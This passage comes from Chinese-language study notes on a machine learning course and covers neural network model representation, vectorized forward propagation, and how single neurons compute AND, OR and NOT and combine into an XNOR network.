alt></p><p>我们设计出了类似于神经元的神经网络，效果如下：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110640.png" alt></p><p>其中$x_1$, $x_2$, $x_3$是输入单元（<strong>input units</strong>），我们将原始数据输入给它们。</p>$a_1$, $a_2$, $a_3$是中间单元，它们负责将数据进行处理，然后呈递到下一层。<p>最后是输出单元，它负责计算${h_\theta}\left( x \right)$。</p><p>神经网络模型是许多逻辑单元按照不同层级组织起来的网络，每一层的输出变量都是下一层的输入变量。下图为一个3层的神经网络，第一层成为输入层（<strong>Input Layer</strong>），最后一层称为输出层（<strong>Output Layer</strong>），中间一层成为隐藏层（<strong>Hidden Layers</strong>）。我们为每一层都增加一个偏差单位（<strong>bias unit</strong>）：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110650.png" alt></p><p>下面引入一些标记法来帮助描述模型：</p>$a_{i}^{\left( j \right)}$ 代表第$j$ 层的第 $i$ 个激活单元。${{\theta }^{\left( j \right)}}$代表从第 $j$ 层映射到第$ j+1$ 层时的权重的矩阵，例如${{\theta }^{\left( 1 \right)}}$代表从第一层映射到第二层的权重的矩阵。其尺寸为：以第 $j+1$层的激活单元数量为行数，以第 $j$ 层的激活单元数加一为列数的矩阵。例如：上图所示的神经网络中${{\theta }^{\left( 1 \right)}}$的尺寸为 3*4。<p>对于上图所示的模型，激活单元和输出分别表达为：</p>$a_{1}^{(2)}=g(\Theta _{10}^{(1)}{{x}_{0}}+\Theta _{11}^{(1)}{{x}_{1}}+\Theta _{12}^{(1)}{{x}_{2}}+\Theta _{13}^{(1)}{{x}_{3}})$$a_{2}^{(2)}=g(\Theta _{20}^{(1)}{{x}_{0}}+\Theta _{21}^{(1)}{{x}_{1}}+\Theta _{22}^{(1)}{{x}_{2}}+\Theta _{23}^{(1)}{{x}_{3}})$$a_{3}^{(2)}=g(\Theta _{30}^{(1)}{{x}_{0}}+\Theta _{31}^{(1)}{{x}_{1}}+\Theta _{32}^{(1)}{{x}_{2}}+\Theta _{33}^{(1)}{{x}_{3}})$${{h}_{\Theta }}(x)=g(\Theta _{10}^{(2)}a_{0}^{(2)}+\Theta _{11}^{(2)}a_{1}^{(2)}+\Theta _{12}^{(2)}a_{2}^{(2)}+\Theta _{13}^{(2)}a_{3}^{(2)})$<p>上面进行的讨论中只是将特征矩阵中的一行（一个训练实例）喂给了神经网络，我们需要将整个训练集都喂给我们的神经网络算法来学习模型。</p><p>我们可以知道：每一个$a$都是由上一层所有的$x$和每一个$x$所对应的决定的。</p><p>（我们把这样从左到右的算法称为前向传播算法( <strong>FORWARD PROPAGATION</strong> )）</p><p>把$x$, $\theta$, $a$ 分别用矩阵表示：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110712.png" alt></p><p>我们可以得到$\theta \cdot X=a$ 。</p><h2 id="8-4-模型表示2-Model-Representation-II"><a href="#8-4-模型表示2-Model-Representation-II" class="headerlink" title="8.4 模型表示2( Model Representation II )"></a>8.4 模型表示2( Model Representation II )</h2><p>在前面的视频里 我们 解释了怎样用数学来 定义或者计算 神经网络算法的假设</p><p>在这段视频中 我想 告诉你如何 高效地进行计算 并展示一个<code>向量化</code>的实现方法</p><p>更重要的是 我想 让你们明白为什么 这样表示神经网络 是一个好的方法 并且明白 它们怎样帮助我们学习复杂的<code>非线性假设</code></p><p>以这个神经网络为例 以前我们说 计算出假设输出 的步骤 是左边的这些 方程 通过这些方程 我们计算出 三个隐藏单元的<code>激励值</code> 然后利用 这些值来计算 假<code>设h(x)</code>的最终输出</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111234714.png" alt></p><p>接下来 我要 定义一些额外的项 因此 这里 我画线的项 把它定义为<code>z上标(2) 下标1</code> 这样一来 就有了 <code>a(2)1</code> 这个项 等于 <code>g(z(2)1)</code> 另外顺便提一下 这些上标2 的意思是 在z(2)和a(2)中 括号中的 2表示这些值 与第二层相关 即与神经网络中的 隐藏层有关</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111235101.png" alt></p><p>接下来 这里的项 我将同样定义为 z(2)2 最后这个 我画线的项 我把它定义为z(2)3 这样 我们有a(2)3 等于 g(z(2)3) 所以这些z值都是 一个线性组合 是输入值x0 x1 x2 x3的 加权线性组合 它将会进入一个特定的神经元</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111235232.png" alt></p><p>现在 看一下 这一堆数字 你可能会注意到这块 对应了 矩阵向量运算 类似于矩阵向量乘法 x1乘以向量x 观察到一点 我们就能将 <strong>神经网络的计算向量化</strong>了</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111235401.png" alt></p><p>具体而言 我们定义 特征向量x 为x0 x1 x2 x3组成的向量 其中x0 仍然等于1 并定义 z(2)为 这些z值组成的向量 即z(2)1 z(2)2 z(2)3 注意 在这里 z(2) 是一个三维向量</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111235654.png" alt></p><p>下面 我们可以这样 向量化a(2)1 a(2)2 a(2)3的计算 我们只用两个步骤 z(2)等于θ(1) 乘以x 这样就有了向量z(2) 然后 a(2)等于 g(z(2)) 需要明白 这里的z(2)是 三维向量 并且 a(2)也是一个三维 向量 因此这 里的激励g 将s函数 逐元素作用于 z(2)中的每个元素</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112000135.png" alt></p><p>顺便说一下 为了让我们 的符号和接下来的 工作相一致 在输入层 虽然我们有 输入x 但我们 还可以把这些想成 是第一层的激励 所以 我可以定义a(1) 等于x 因此 a(1)就是一个向量了 我就可以把这里的x 替换成a(1) z(2)就等于θ(1)乘以a(1) 这都是通过在输入层定义a(1)做到的</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112000309.png" alt></p><p>现在 就我目前所写的 我得到了 a1 a2 a3的值 并且 我应该把 上标加上去 但我还需要一个值 我同样需要这个a(2)0 它对应于 隐藏层的 得到这个输出的<code>偏置单元</code> 当然 这里也有一个 偏置单元 我只是没有 画出来</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112000748.png" alt></p><p>注意这额外的偏置单元 接下来我们 要额外加上一个<strong>a0 上标(2) 它等于1</strong> 这样一来 现在 a(2)就是一个 四维的特征向量 因为我们刚添加了 这个额外的 a0 它等于 1并且它是隐藏层的 一个偏置单元</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112000930.png" alt></p><p>最后 为了计算假设的 实际输出值 我们 只需要计算 z(3) z(3)等于 这里我画线的项 这个方框里的项就是z(3)</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112001106.png" alt></p><p>z(3)等于θ(2) 乘以a(2) 最后 假设输出为h(x) 它等于a(3) a(3)是输出层 唯一的单元 它是一个实数 你可以写成a(3) 或a(3)1 这就是g(z(3)) 这个计算h(x)的过程 也称为<code>前向传播(forward propagation)</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112001235.png" alt></p><p>这样命名是因为 我们从 输入层的激励开始 然后进行前向传播给 隐藏层并计算 隐藏层的激励 然后 我们继续前向传播 并计算输出层的激励</p><p>这个从输入层到 隐藏层再到输出层依次计算激励的 过程叫<code>前向传播</code></p><p>我们刚刚得到了 这一过程的向量化 实现方法 如果你 使用右边这些公式实现它 就会得到 一个有效的 计算h(x) 的方法</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112001704.png" alt></p><p>这种前向传播的角度 也可以帮助我们了解 神经网络的原理 和它为什么能够 帮助我们学习<code>非线性假设</code></p><p>看一下这个神经网络 我会暂时盖住 图片的左边部分 如果你观察图中剩下的部分 这看起来很像 逻辑回归 在逻辑回归中 我们用 这个节点 即 这个逻辑回归单元 来预测 h(x)的值 具体来说 假设输出的 h(x)将 等于s型激励函数 g(θ0 xa0 +θ1xa1 +θ2xa2 +θ3xa3) 其中 a1 a2 a3 由这三个单元给出</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112002014.png" alt></p><p>为了和我之前的定义 保持一致 需要 在这里 还有这些地方都填上上标(2) 同样还要加上这些下标1 因为我只有 一个输出单元 但如果你只观察蓝色的部分 这看起来 非常像标准的 <code>逻辑回归模型</code> 不同之处在于 我现在用的是大写的θ 而不是小写的θ 这样做完 我们只得到了<code>逻辑回归</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112002144.png" alt></p><p>但是 逻辑回归的 输入特征值 是通过隐藏层计算的 神经网络所做的 就像逻辑回归 但是它 不是使用 x1 x2 x3作为输入特征 而是用a1 a2 a3作为新的输入特征 同样 我们需要把<br>上标加上来和之前的记号保持一致</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112002632.png" alt></p><p>有趣的是 特征项a1 a2 a3它们是作为 输入的函数来学习的 具体来说 就是从第一层 映射到第二层的函数 这个函数由其他 一组参数θ(1)决定 所以 在神经网络中 它没有用 输入特征x1 x2 x3 来训练逻辑回归 而是自己 训练逻辑回归 的输入 a1 a2 a3 可以想象 如果 在θ1中选择不同的参数 有时可以学习到一些 很有趣和复杂的特征 就可以 得到一个 更好的假设 比使用原始输入 x1 x2或x3时得到的假设更好 你也可以 选择多项式项 x1 x2 x3等作为输入项 但这个算法可以 <strong>灵活地 快速学习任意的特征项</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112003647.png" alt></p><p>我觉得现在描述的这个例子 有点高端 所以 我不知道 你是否能理解 这个具有更复杂特征项的 神经网络 但是 如果你没理解 在接下来的两个视频里 我会讲解一个具体的例子 它描述了怎样用神经网络 如何利用这个隐藏层 计算更复杂的特征 并输入到最后的输出层 以及为什么这样就可以学习更复杂的假设 所以 如果我 现在讲的 你没理解 请继续 观看接下来的两个视频 希望它们 提供的例子能够 让你更加理解神经网络 但有一点 你还可以用其他类型的图来 表示神经网络 神经网络中神经元 相连接的方式 称为<code>神经网络的架构</code> 所以说 <code>架构</code>是指 <strong>不同的神经元是如何相互连接的</strong> 这里有一个不同的 神经网络架构的例子</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112004927.png" alt></p><p>你可以 意识到这个第二层 是如何工作的 在这里 我们有三个隐藏单元 它们根据输入层 计算一个复杂的函数 然后第三层 可以将第二层 训练出的特征项作为输入 并在第三层计算一些更复杂的函数 这样 在你到达 输出层之前 即第四层 就可以利用第三层 训练出的更复杂的 特征项作为输入 以此得到非常有趣的非线性假设</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112005012.png" alt></p><p>顺便说一下 在这样的 网络里 第一层 被称为输入层 第四层 仍然是我们的输出层 这个网络有两个隐藏层 所以 任何一个不是 输入层或输出层的 都被称为隐藏层</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112005052.png" alt></p><p>我希望从这个视频中 你已经大致理解 <strong><code>前向传播</code>在神经网络里的工作原理</strong>： 从输入层的激励 开始 向前 传播到 第一隐藏层 然后传播到第二 隐藏层 最终到达输出层 并且你也知道了如何 向量化这些计算</p><p>我发现 这个视频里我讲了 某些层是如何 计算前面层的复杂特征项 我意识到这可能 仍然有点抽象 显得比较高端 所以 我将 在接下来的两个视频中 讨论具体的例子 它描述了怎样用神经网络 来计算 输入的非线性函数 希望能使你 更好的理解 从神经网络中得到的复杂非线性假设</p><h3 id="小小的总结–模型表示2"><a href="#小小的总结–模型表示2" class="headerlink" title="小小的总结–模型表示2"></a>小小的总结–模型表示2</h3><p>( <strong>FORWARD PROPAGATION</strong> )<br>相对于使用循环来编码，利用向量化的方法会使得计算更为简便。以上面的神经网络为例，试着计算第二层的值：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110758.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110810.png" alt></p><p>我们令 ${{z}^{\left( 2 \right)}}={{\theta }^{\left( 1 \right)}}x$，则 ${{a}^{\left( 2 \right)}}=g({{z}^{\left( 2 \right)}})$ ，计算后添加 $a_{0}^{\left( 2 \right)}=1$。 计算输出的值为：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110836.png" alt></p><p>我们令 ${{z}^{\left( 3 \right)}}={{\theta }^{\left( 2 \right)}}{{a}^{\left( 2 \right)}}$，则 $h_\theta(x)={{a}^{\left( 3 \right)}}=g({{z}^{\left( 3 \right)}})$。<br>这只是针对训练集中一个训练实例所进行的计算。如果我们要对整个训练集进行计算，我们需要将训练集特征矩阵进行转置，使得同一个实例的特征都在同一列里。即：</p>${{z}^{\left( 2 \right)}}={{\Theta }^{\left( 1 \right)}}\times {{X}^{T}} $ ${{a}^{\left( 2 \right)}}=g({{z}^{\left( 2 \right)}})$<p>为了更好了了解<strong>Neuron Networks</strong>的工作原理，我们先把左半部分遮住：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110857.png" alt></p><p>右半部分其实就是以$a_0, a_1, a_2, a_3$, 按照<strong>Logistic Regression</strong>的方式输出$h_\theta(x)$：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110906.png" alt></p><p>其实神经网络就像是<strong>logistic regression</strong>，只不过我们把<strong>logistic regression</strong>中的输入向量$\left[ x_1\sim {x_3} \right]$ 变成了中间层的$\left[ a_1^{(2)}\sim a_3^{(2)} \right]$, 即:  $h_\theta(x)=g\left( \Theta_0^{\left( 2 \right)}a_0^{\left( 2 \right)}+\Theta_1^{\left( 2 \right)}a_1^{\left( 2 \right)}+\Theta_{2}^{\left( 2 \right)}a_{2}^{\left( 2 \right)}+\Theta_{3}^{\left( 2 \right)}a_{3}^{\left( 2 \right)} \right)$<br>我们可以把$a_0, a_1, a_2, a_3$看成更为高级的特征值，也就是$x_0, x_1, x_2, x_3$的进化体，并且它们是由 $x$与$\theta$决定的，因为是梯度下降的，所以$a$是变化的，并且变得越来越厉害，所以这些更高级的特征值远比仅仅将 $x$次方厉害，也能更好的预测新数据。<br>这就是神经网络相比于逻辑回归和线性回归的优势。</p><h2 id="8-5-特征和直观理解1-Examples-and-Intuitions-I"><a href="#8-5-特征和直观理解1-Examples-and-Intuitions-I" class="headerlink" title="8.5 特征和直观理解1(Examples and Intuitions I)"></a>8.5 特征和直观理解1(Examples and Intuitions I)</h2><p>在接下来两节视频中 我要通过讲解 一个具体的例子来解释 神经网络是如何计算 关于输入的复杂的<code>非线性函数</code> 希望这个例子可以 让你了解为什么 神经网络可以用来学习复杂的非线性假设</p><p>考虑下面的问题 我们有二进制的 输入特征 x1 x2 要么取0 要么取1 所以x1和x2只能 有两种取值</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112145858.png" alt></p><p>在这个例子中 我只画出了 两个正样本和 两个负样本 但你可以认为这是一个 更复杂的学习问题的 简化版本 在这个复杂问题中 我们可能 在右上角有一堆<strong>正样本（红色叉叉）</strong> 在左下方有 一堆用<strong>圆圈表示的负样本</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112150052.png" alt></p><p>我们想要学习一种非线性的 决策边界来 区分正负样本 那么 神经网络是 如何做到的呢？</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112150138.png" alt></p><p>为了描述方便我不用右边这个例子 我用左边这个例子 这样更容易说明 具体来讲 这里需要计算的是 <code>目标函数y</code> 等于<strong>x1异或x2</strong> 或者 y也可以等于 x1<strong>异或非</strong>x2 其中异或非表示 <strong>x1异或x2后取反</strong> X1异或X2 为真当且仅当 这两个值 X1或者X2中有且仅有一个为1 如果我 用XNOR作为例子 比用NOT作为例子 结果会好一些 但这两个其实是相同的 这就意味着在x1 异或x2后再取反 即 <strong>当它们同时为真 或者同时为假的时候 我们将获得 y等于1的结果</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112150441.png" alt></p><p>如果它们中<strong>仅有一个 为真 y则为0</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112150535.png" alt></p><p>我们想要知道是否能 找到一个神经网络模型来拟合这种训练集</p><p>为了建立 能拟合<code>XNOR运算</code> 的神经网络 我们先 讲解一个稍微简单 的神经网络 它拟合了<code>“且运算”</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112150741.png" alt></p><p>假设我们 有输入x1和 x2 并且都是二进制 即要么为0要么为1 我们的<code>目标函数y</code>正如你所知道的 等于<code>x1且x2</code> 这是一个<code>逻辑与</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112150855.png" alt></p><p>那么 我们怎样得到一个 具有单个神经元的神经网络来计算 这个逻辑与呢 为了做到这一点 我也需要画出<code>偏置单元</code> 即这个里面有个<code>+1的单元</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112150954.png" alt></p><p>现在 让我给这个网络 分配一些权重 或参数 我在图上写出这些参数 这里是-30 正20 正20 即我给 x0前面的 系数赋值 为-30. 这个正1会 作为这个单元的值 关于20的参数值 且x1乘以+20 以及x2乘以+20 都是这个单元的输入</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112151059.png" alt></p><p>所以 我的假设ħ(x) 等于 g(-30 + 20x1 + 20x2) 在图上画出 这些参数和 权重是很方便很直观的 其实 在这幅神经网络图中 这个-30 其实是θ(1)10 这个是 θ(1)11 这是 θ(1)12 但把它想成 这些边的 权重会更容易理解</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112151204.png" alt></p><p>让我们来看看这个小神经元是怎样计算的 回忆一下 s型 激励函数g(z)看起来是这样的 它从0开始 光滑 上升 穿过0.5 渐进到1.</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112151258.png" alt></p><p>我们给出一些坐标 如果横轴值 z等于4.6 则 S形函数等于0.99 这是非常接近 1的 并且由于对称性 如果z为-4.6 S形函数 等于0.01 非常接近0</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112151412.png" alt></p><p>让我们来看看四种可能的输入值 x1和x2的四种可能输入 看看我们的假设 在各种情况下的输出 如果X1和X2均为 0 那么 你看看这个 如果 x1和x2都等于 为0 则假设会输出g(-30) g(-30)在图的 很左边的地方 非常接近于0</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112151716.png" alt></p><p>如果x1等于0且 x2等于1 那么 此公式等于 g关于 -10取值 也在很左边的位置 所以 也是非常接近0 这个也是g(-10) 也就是说 如果x1 等于1并且 x2等于0 这就是-30加20等于-10 最后 如​​果 x1等于1 x2等于 1 那么这等于 -30 +20 +20 所以这是 取+10时 非常接近1</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112151844.png" alt></p><p>如果你看看 在这一列 这就是 逻辑“与”的计算结果 所以 这里得到的h h关于x取值 近似等于x1和x2的与运算的值 换句话说 假设输出 1 当且仅当 x1 x2 都等于1 所以 通过写出 这张真值表 我们就弄清楚了 神经网络 计算出的逻辑函数</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112152000.png" alt></p><p>这里的神经网络 实现了或函数的功能 接下来我告诉你是怎么看出来的 如果你把 假设写出来 会发现它等于 g关于-10 +20x1 +20x2的取值 如果把这些值都填上 会发现 这是g(-10) 约等于0 这是g(10) 约等于1 这个也约等于1</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112152137.png" alt></p><p>这些数字 本质上就是逻辑或 运算得到的值</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112152206.png" alt></p><p>所以 我希望 通过这个例子 你现在明白了 神经网络里单个的 神经元在计算 如AND和OR逻辑运算时是怎样发挥作用的 在接下来的视频中 我们将继续 讲解一个更复杂的例子 我们将告诉你 一个多层的神经网络 怎样被用于 计算更复杂的函数  如 XOR 函数或 XNOR 函数</p><h3 id="小小的总结–特征和直观理解I"><a href="#小小的总结–特征和直观理解I" class="headerlink" title="小小的总结–特征和直观理解I"></a>小小的总结–特征和直观理解I</h3><p>从本质上讲，神经网络能够通过学习得出其自身的一系列特征。在普通的逻辑回归中，我们被限制为使用数据中的原始特征$x_1,x_2,...,{{x}_{n}}$，我们虽然可以使用一些二项式项来组合这些特征，但是我们仍然受到这些原始特征的限制。在神经网络中，原始特征只是输入层，在我们上面三层的神经网络例子中，第三层也就是输出层做出的预测利用的是第二层的特征，而非输入层中的原始特征，我们可以认为第二层中的特征是神经网络通过学习后自己得出的一系列用于预测输出变量的新特征。</p><p>神经网络中，单层神经元（无中间层）的计算可用来表示逻辑运算，比如逻辑与(<strong>AND</strong>)、逻辑或(<strong>OR</strong>)。</p><p>举例说明：逻辑与(<strong>AND</strong>)；下图中左半部分是神经网络的设计与<strong>output</strong>层表达式，右边上部分是<strong>sigmod</strong>函数，下半部分是真值表。</p><p>我们可以用这样的一个神经网络表示<strong>AND</strong> 函数：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111107.png" alt></p><p>其中$\theta_0 = -30, \theta_1 = 20, \theta_2 = 20$<br>我们的输出函数$h_\theta(x)$即为：$h_\Theta(x)=g\left( -30+20x_1+20x_2 \right)$</p><p>我们知道$g(x)$的图像是：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111113.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111120.png" alt></p><p>所以我们有：$h_\Theta(x) \approx \text{x}_1 \text{AND} \, \text{x}_2$</p><p>所以我们的：$h_\Theta(x) $</p><p>这就是<strong>AND</strong>函数。</p><p>接下来再介绍一个<strong>OR</strong>函数：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111126.png" alt></p><p><strong>OR</strong>与<strong>AND</strong>整体一样，区别只在于的取值不同。</p><h2 id="8-6-样本和直观理解II-Examples-and-Intuitions-II"><a href="#8-6-样本和直观理解II-Examples-and-Intuitions-II" class="headerlink" title="8.6 样本和直观理解II(Examples and Intuitions II)"></a>8.6 样本和直观理解II(Examples and Intuitions II)</h2><p>在这段视频中 我想通过例子来向大家展示 一个神经网络 是怎样计算<code>非线性的假设函数</code></p><p>在上一段视频中 我们学习了 怎样运用神经网络 来计算x1和x2的<code>与运算</code> 以及x1和x2的<code>或运算</code> 其中x1和x2都是二进制数 也就是说 它们的值只能为0或1 同时 我们也学习了 怎样进行<code>逻辑非</code>运算 也就是计算 “非x1” 我先写出这个神经网络中 相连接的各权值 这里我们只有一个输入量x1 在这里我们也加上了 表示<code>偏差的单位元</code> +1 如果我将输入单元和两个权数相连 也就是+10和-20 则可用以下假设方程来计算 <code>h(x)=g(10-20x1)</code> 其中<code>g</code>是一个<code>S型函数</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112152619.png" alt></p><p>那么 当x1等于0时 计算出假设函数 g(10-20*0) 也就是g(10) 这个值近似的等于1 而当x等于1时 计算出的假设函数则变成 g(-10) 也就是约等于0 如果你观察这两个值 你会发现这实际上计算的 就是“非x1”函数</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112152711.png" alt></p><p>所以要计算<code>逻辑非运算</code> 总体思路是 在你希望<strong>取非运算的变量前面 放上一个绝对值大的负数作为权值</strong> 因此 如果放一个-20 那么和x1相乘 很显然 最终的结果 就得到了对x1进行非运算的效果</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112152935.png" alt></p><p>另外 我再给出一个例子 计算这样一个函数 <code>(非x1)与(非x2)</code> 我希望大家思考一下 自己动手算一算 你大概应该知道 至少应该<strong>在x1和x2前面 放一个绝对值比较大的负数作为权值</strong> 不过 还有一种可行的方法 是<strong>建立一个神经网络来计算 用只有一个输出单元的神经网络</strong> 没问题吧？ 因此 这个看起来很长的逻辑函数 “(非x1)与(非x2)”的值 将等于1 当且仅当 x1等于x2等于0 所以 这是个逻辑函数 这里是非x1 也就是说x1必为0 然后是非x2 这表示x2也必为0 因此这个逻辑函数等于1 当且仅当 x1和x2的值都为0时成立</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153132.png" alt></p><p>现在你应该也清楚了 怎样建立一个小规模的神经网络 来计算 这个逻辑函数的值</p><p>把以上我们介绍的 这三个部分内容放在一起 “x1与x2”与运算的网络 以及计算 “(非x1)与(非x2)”的网络 还有最后一个是 “x1或x2”的或运算网络 把这三个网络放在一起 我们就应该能计算 “x1 XNOR x2” 也就是<code>同或门运算</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153229.png" alt></p><p>提醒一下 如果这是x1 x2 那么我们想要计算的这个函数 在这里和这里是负样本 而在这里和这里 函数有正样本值 那么很显然 为了分隔开正样本和负样本 我们需要一个<code>非线性的判别边界</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153334.png" alt></p><p>这里我们用以下这个网络来解决 取输入单元 +1 x1和x2 建立第一个隐藏层单元 我们称其为a(2)1 因为它是第一个隐藏单元 接下来我要从红色的网络 也就是”x1与x2”这个网络 复制出权值 也就是-30 20 20 接下来 我再建立第二个隐藏单元 我们称之为a(2)2 它是第二层的第二个隐藏单元 然后再从中间的青色网络中 复制出权值 这样我们就有了 10 -20 -20 这样三个权值</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153443.png" alt></p><p>因此 我们来看一下真值表中的值 对于红色的这个网络 我们知道是x1和x2的与运算 所以 这里的值大概等于0 0 0 1 这取决于x1和x2的具体取值</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153548.png" alt></p><p>对于a (2)2 也就是青色的网络 我们知道这是“(非x1)与(非x2)”的运算 那么对于x1和x2的四种取值 其结果将为 1 0 0 0</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153638.png" alt></p><p>最后 建立输出节点 也就是输出单元 a(3)1 这也是等于输出值h(x) 然后 复制一个或运算网络 同时 我需要一个+1作为偏差单元 将其添加进来 然后从绿色的网络中复制出所有的权值 也就是-10 20 20</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153733.png" alt></p><p>我们之前已经知道这是一个<code>或运算</code>函数 那么我们继续看真值表的值 第一行的值是0和1的或运算 其结果为1 然后是0和0的或运算 其结果为0 0和0的或运算 结果还是0 1和0的或运算 其结果为1</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153836.png" alt></p><p>因此 h(x)的值等于1 当x1和x2都为0 或者x1和x2都为1的时候成立 具体来说 在这两种情况时 h(x)输出1 在另两种情况时 h(x)输出0 那么对于这样一个神经网络 有一个输入层 一个隐藏层 和一个输出层 我们最终得到了 计算<code>XNOR函数</code>的<code>非线性判别边界</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112153940.png" alt></p><p>更一般的理解是 在输入层中 我们只有原始输入值 然后我们建立了一个隐藏层 用来计算稍微复杂一些的 输入量的函数 如图所示 这些都是稍微复杂一些的函数 然后 通过添加另一个层 我们得到了一个更复杂一点的函数 这就是关于 神经网络可以计算较复杂函数 的某种直观解释</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112154036.png" alt></p><p>我们知道 当层数很多的时候 你有一个相对简单的输入量的函数 作为第二层 而第三层可以建立在此基础上 来计算更加复杂一些的函数 然后再下一层 又可以计算再复杂一些的函数</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112154119.png" alt></p><p>在这段视频的最后 我想给大家展示一个有趣的例子 这是一个神经网络 通过运用更深的层数 来计算更加复杂函数的例子 我将要展示的这段视频 来源于我的一个好朋友 阳乐昆(Yann LeCun) Yann是一名教授 供职于纽约大学 他也是神经网络研究 早期的奠基者之一 也是这一领域的大牛 他的很多理论和想法 现在都已经被应用于 各种各样的产品和应用中 遍布于全世界 所以我想向大家展示一段 他早期工作中的视频 这段视频中 他使用神经网络的算法 进行<code>手写数字的辨识</code></p><p>你也许记得 在这门课刚开始的时候 我说过 关于神经网络的一个早期成就 就是应用神经网络 读取邮政编码 以帮助我们进行邮递 那么这便是其中一种尝试 这就是为了解决这个问题 而尝试采用的一种算法</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112154302.png" alt></p><p>在视频中 这个区域 是输入区域 表示的是手写字符 它们将被传递给神经网络 这一列数字表示 通过该网络第一个隐藏层运算后 特征量的可视化结果 因此通过第一个隐藏层 可视化结果显示的是 探测出的不同特征 不同边缘和边线</p><p>这是下一个隐藏层的可视化结果 似乎很难看出 怎样理解更深的隐藏层 以及下一个隐藏层 计算的可视化结果 可能你如果要想看出到底在进行怎样的运算 还是比较困难的 最终远远超出了第一个隐藏层的效果 但不管怎样 最终这些学习后的特征量 将被送到最后一层 也就是输出层 并且在最后作为结果 显示出来 最终预测到的结果 就是这个神经网络辨识出的手写数字的值 下面我们来观看这段视频</p><p>我希望你 喜欢这段视频 也希望这段视频能给你一些直观的感受 关于神经网络可以学习的 较为复杂一些的函数 在这个过程中 它使用的输入是不同的图像 或者说 就是一些原始的像素点 第一层计算出一些特征 然后下一层再计算出 一些稍复杂的特征 然后是更复杂的特征 然后这些特征 实际上被最终传递给 最后一层<code>逻辑回归分类器</code>上 使其准确地预测出 神经网络“看”到的数字</p><h3 id="小小的总结–特征和直观理解II"><a href="#小小的总结–特征和直观理解II" class="headerlink" title="小小的总结–特征和直观理解II"></a>小小的总结–特征和直观理解II</h3><p>二元逻辑运算符（<strong>BINARY LOGICAL 